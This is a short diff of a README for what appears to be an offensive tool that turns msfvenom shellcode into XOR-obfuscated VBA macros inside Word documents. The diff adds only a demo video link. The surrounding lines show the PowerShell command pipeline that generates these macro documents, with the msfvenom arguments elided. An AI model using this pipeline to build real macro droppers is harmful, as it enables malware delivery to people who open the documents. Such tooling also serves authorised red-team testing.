@@ -90,7 +90,9 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
         Invoke-XOR -Key "StarWatchThisRepo" | `
         Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "StarWatchThisRepo" -Verbose
     ```
-
+    
+    https://user-images.githubusercontent.com/11601622/182009478-5e52ae7d-9bdb-44e5-bf25-06c57597d4be.mp4
+        
     > [!WARNING]
     > The length of the key must be shorted than the shellcode.
 
